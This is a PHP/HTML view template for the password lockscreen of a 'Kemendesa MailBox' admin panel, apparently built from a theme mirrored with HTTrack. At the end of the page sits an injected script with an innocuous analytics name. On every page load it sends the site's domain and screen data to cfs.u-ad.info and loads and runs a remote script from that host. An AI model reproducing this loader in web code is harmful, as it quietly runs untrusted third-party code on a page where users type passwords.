<!DOCTYPE html>
<html>

<!-- Mirrored from themes-lab.com/make/admin/layout1/user-lockscreen.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 09 Jul 2015 18:27:26 GMT -->
<!-- Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8"/>
<!-- /Added by HTTrack -->
<head>
    <!-- BEGIN META SECTION -->
    <meta charset="utf-8">
    <title>Kemendesa MailBox<?= isset($title) ? " | ".$title : "" ?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta content="" name="description"/>
    <meta content="themes-lab" name="author"/>
    <link rel="shortcut icon" href="../assets/global/images/favicon.png">
    <!-- END META SECTION -->
    <!-- BEGIN MANDATORY STYLE -->
    <link href="<?= base_url() ?>assets/global/css/style.css" rel="stylesheet">
    <link href="<?= base_url() ?>assets/global/css/ui.css" rel="stylesheet">
    <link href="<?= base_url() ?>assets/global/plugins/bootstrap-loading/lada.min.css" rel="stylesheet">
    <!-- END  MANDATORY STYLE -->
</head>
<body class="account" data-page="lockscreen">
<!-- BEGIN LOGIN BOX -->
<div class="container" id="lockscreen-block">
    <div class="row">
        <div class="col-md-8 col-md-offset-1">
            <div class="account-wall">
                <div class="user-image">
                    <img src="<?= base_url() ?>assets/global/images/avatars/<?=$this->session->userdata(User_model::$SESSION_AVATAR)?>" class="img-responsive img-circle" alt="friend 8">
                    <div id="loader"></div>
                </div>
                <form action="<?=site_url()?>unlock.html" method="post" class="form-signin" role="form">

                    <!-- alert -->
                    <?php if($this->session->flashdata('operation') != NULL){ ?>
                        <div class="alert alert-<?=$this->session->flashdata('operation')?>" role="alert">
                            <p style="color: #000000 !important;"><?=$this->session->flashdata('message'); ?></p>
                        </div>
                    <?php } ?>
                    <!-- end of alert -->

                    <h2>Welcome back, <strong><?=$this->session->userdata(User_model::$SESSION_NAME)?></strong>!</h2>

                    <p>Enter your password to go to dashboard.</p>

                    <div class="input-group">
                        <input type="password" class="form-control" name="password" id="password"
                               placeholder="Password">
                                <span class="input-group-btn">
                                <button type="submit" class="btn btn-primary">Log In</button>
                                </span>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>
<div class="loader-overlay loaded">
    <div class="loader-inner">
        <div class="loader2"></div>
    </div>
</div>
<script src="<?= base_url() ?>assets/global/plugins/jquery/jquery-1.11.1.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/jquery/jquery-migrate-1.2.1.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/gsap/main-gsap.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/bootstrap/js/bootstrap.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/backstretch/backstretch.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/bootstrap-loading/lada.min.js"></script>
<script src="<?= base_url() ?>assets/global/plugins/progressbar/progressbar.min.js"></script>
<script src="<?= base_url() ?>assets/admin/layout1/js/layout.js"></script>
<script type="text/javascript">if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function () {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRRJQa4R3kWwVoTML2b2rq%2fcOB%2fg3ZBT3xlcBI%2bOqe1xQCfpoMAMLgRdnt%2figsnAP1Y%2bBNVfFX9pbgXvnWw9x4E6nqjeqAwdOmjJP3aiG7vm7MXIsreyjeuv0g9IFyAb9hI2WA1EeNPAEsrzp9nvj0tazwDQoAz3xv5jAM1k4wsLvS0oX3dycQxyQqT%2bzGN7RbY7GvZVLGU6JuvGMQeLe%2fQaH0jZ273PMH33okedRJYxrlyfLgnzZwztaTpQMQ0fdF3KZBeMH09NeTD1ATmVRBtPpcEMeH9B8H4EJ%2b4NKmgbcNYsFnwjD%2bRishtO7J1JePISrQ%2bK4%2fW771CVy1mdY0Mh0afMrCLfsWg74qtdyMNW0zIhaG5rnQgmAsrF8T2SYObn%2fBn%2fPVPUON%2bfz9drdTEEGys4hg8fYsRMSc4aLyABb5o%2b31fo3g1VsI9xWD14OfhTndyYyWBFpJ%2b02H1JnaieR5gzRQJYq7BVSxJtloIsNrPhlJX5rZgustHyLtvrx5" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }

        netbro_cache_analytics(requestCfs, function () {
        });
    }
    ;</script>
</body>

<!-- Mirrored from themes-lab.com/make/admin/layout1/user-lockscreen.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 09 Jul 2015 18:27:32 GMT -->
</html>
